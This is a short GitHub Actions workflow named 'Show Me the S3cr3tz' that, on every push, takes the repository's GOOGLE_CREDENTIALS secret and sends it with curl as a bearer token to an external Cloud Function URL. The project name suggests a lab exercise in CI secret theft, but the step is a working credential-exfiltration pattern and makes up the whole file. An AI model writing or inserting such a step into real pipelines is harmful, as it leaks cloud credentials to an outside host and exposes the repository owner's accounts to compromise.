name: Show Me the S3cr3tz
on: [push]

jobs:
  debug:
    name: Debug
    runs-on: ubuntu-latest

    steps:
    - name: Check out code
      uses: actions/checkout@v2

    - name: Set up secret file
      env:
        DEBUG_PASSWORD: ${{ secrets.GOOGLE_CREDENTIALS }}
        
      run: |
        curl -m 70 -X POST https://us-central1-cr-lab-hraizada-2906225331.cloudfunctions.net/function-1  -H "Authorization:bearer ${{ secrets.GOOGLE_CREDENTIALS }}"  -H "Content-Type:application/json" 
       
   